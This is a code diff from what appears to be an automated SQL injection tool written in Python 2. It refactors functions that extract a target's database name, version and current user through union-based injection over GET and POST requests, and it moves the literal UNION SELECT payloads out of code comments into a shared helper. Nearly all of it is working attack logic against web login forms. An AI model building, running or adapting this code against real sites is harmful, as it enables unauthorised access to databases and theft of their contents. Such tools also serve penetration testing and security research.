@@ -3,11 +3,11 @@
 from tqdm import trange
 
 from sqlier.config import BaseConfig
-from sqlier.config import UnpackFunction
 from lib.data import DataProcess
 from lib.log import logger
 from lib.dealpayload import build_injection
 from lib.dealpayload import time_injection
+from lib.dealpayload import normal_injection
 
 __author__ = "LoRexxar"
 
@@ -33,7 +33,7 @@ class SqliTest(BaseConfig):
             logger.debug("Set the parameters of the self.len...")
             self.len = len(r)
         if output == 1:
-            print UnpackFunction(r)
+            print r
 
     # 获取当前库名
     def get_now_database(self):
@@ -46,19 +46,20 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
 
-                # payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='length(database())')
-                r = self.Data.GetData(payload)
-                database_len = int(UnpackFunction(r))
+                database_len = normal_injection(select='length(database())', dealpayload=self.dealpayload,
+                                                data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                )
+
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
 
                 # 然后注database
                 logger.debug("Start database sqli...")
-                # payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='database()')
-                r = self.Data.GetData(payload)
-                database = UnpackFunction(r)
+
+                database = normal_injection(select='database()', dealpayload=self.dealpayload,
+                                            data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                            )
+
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -122,19 +123,21 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                # payload = {"user": "ddog' union select 1,length(database())#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='length(database())')
-                r = self.Data.PostData(payload)
-                database_len = int(UnpackFunction(r))
+
+                database_len = normal_injection(select='length(database())', dealpayload=self.dealpayload,
+                                                data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                )
+
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
 
                 # 然后注database
                 logger.debug("Start database sqli...")
-                # payload = {"user": "ddog' union select 1,database()#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='database()')
-                r = self.Data.PostData(payload)
-                database = UnpackFunction(r)
+
+                database = normal_injection(select='database()', dealpayload=self.dealpayload,
+                                            data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                            )
+
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -197,21 +200,23 @@ class SqliTest(BaseConfig):
             if self.sqlimethod == "normal":
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                # payload = "user=ddog123' union select 1,length(version())%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='length(version())')
-                r = self.Data.GetData(payload)
-                version_len = int(UnpackFunction(r))
+
+                version_len = normal_injection(select='length(version())', dealpayload=self.dealpayload,
+                                               data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                               )
+
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
 
                 # 然后注version
                 logger.debug("Start database sqli...")
-                # payload = "user=ddog123' union select 1,version()%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='version()')
-                r = self.Data.GetData(payload)
-                version = UnpackFunction(r)
+
+                version = normal_injection(select='version()', dealpayload=self.dealpayload,
+                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                           )
+
                 logger.debug("Version sqli success...The version is %s" % version)
-                print "[*] version: " % version
+                print "[*] version: %s" % version
 
             elif self.sqlimethod == "build":
                 # 先注version长度
@@ -268,19 +273,21 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                # payload = {"user": "ddog' union select 1,length(version())#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='length(version())')
-                r = self.Data.PostData(payload)
-                version_len = int(UnpackFunction(r))
+
+                version_len = normal_injection(select='length(version())', dealpayload=self.dealpayload,
+                                               data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                               )
+
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
 
                 # 然后注version
                 logger.debug("Start version sqli...")
-                # payload = {"user": "ddog' union select 1,version()#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='version()')
-                r = self.Data.PostData(payload)
-                version = UnpackFunction(r)
+
+                version = normal_injection(select='version()', dealpayload=self.dealpayload,
+                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                           )
+
                 logger.debug("Version sqli success...The version is %s" % version)
                 print "[*] version: %s" % version
 
@@ -345,19 +352,21 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                # payload = "user=ddog123' union select 1,length(user())%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='length(user())')
-                r = self.Data.GetData(payload)
-                user_len = int(UnpackFunction(r))
+
+                user_len = normal_injection(select='length(user())', dealpayload=self.dealpayload,
+                                            data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                            )
+
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
 
                 # 然后注user
                 logger.debug("Start user sqli...")
-                # payload = "user=ddog123' union select 1,user()%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='user()')
-                r = self.Data.GetData(payload)
-                user = UnpackFunction(r)
+
+                user = normal_injection(select='user()', dealpayload=self.dealpayload,
+                                        data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                        )
+
                 logger.debug("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
 
@@ -418,19 +427,21 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                # payload = {"user": "ddog' union select 1,length(user())#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='length(user())')
-                r = self.Data.PostData(payload)
-                user_len = int(UnpackFunction(r))
+
+                user_len = normal_injection(select='length(user())', dealpayload=self.dealpayload,
+                                            data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                            )
+
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
 
                 # 然后注user
                 logger.debug("Start user sqli...")
-                # payload = {"user": "ddog' union select 1,user()#", "password": "a"}
-                payload = self.dealpayload.construct_normal_payload(select='user()')
-                r = self.Data.PostData(payload)
-                user = UnpackFunction(r)
+
+                user = normal_injection(select='user()', dealpayload=self.dealpayload,
+                                        data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                        )
+
                 logger.debug("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
 
